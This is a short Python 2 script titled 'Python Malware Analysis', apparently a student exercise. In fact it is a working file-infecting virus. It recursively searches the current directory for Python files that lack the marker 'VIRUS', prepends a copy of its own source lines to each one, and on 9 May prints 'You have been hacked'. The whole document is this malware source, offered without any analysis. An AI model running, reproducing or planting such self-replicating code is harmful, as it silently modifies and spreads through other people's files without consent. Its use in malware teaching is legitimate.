#!/usr/bin/python
#Script Name    Python Malware Analysis
#Author         sujan thapa magar
#Date of last revision  09/16/2022

# imports modules
import os
import datetime

# creates variable 
SIGNATURE = "VIRUS"

# creates first function
def locate(path):
    files_targeted = []
    # gets all files and directores in "path"
    filelist = os.listdir(path)
     # Method to get the list of all files and directories in the path directory
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
          # adds elements (paths and names) to list
            files_targeted.extend(locate(path+"/"+fname))
        # sets infected status to false if a file is python
        elif fname[-3:] == ".py":
            # Makes infected variable equal false
            infected = False
            # for loop
            for line in open(path+"/"+fname):
                # get previous variable to set file status 
                if SIGNATURE in line:
                    infected = True
                    break
                    
               # if infected equals false
            if infected == False:
                # add path and name to list
                files_targeted.append(path+"/"+fname)
    # ends function and returns result
    return files_targeted

# creates second function
def infect(files_targeted):
    # creates variable 
    virus = open(os.path.abspath(__file__))
    # creates empty variable 
    virusstring = ""
    # for loop 
    for i,line in enumerate(virus):
        if 0 <= i < 39:
          # adds the two variables and assigns  value
            virusstring += line
    virus.close
    # for loop 
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# creates third function
def detonate():
    # specifies date using imported datetime module
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # prints line to screen
        print "You have been hacked"
        
# calls defined functions  to find specified files 
files_targeted = locate(os.path.abspath(""))
# infect files in the files_targeted
infect(files_targeted)
detonate()
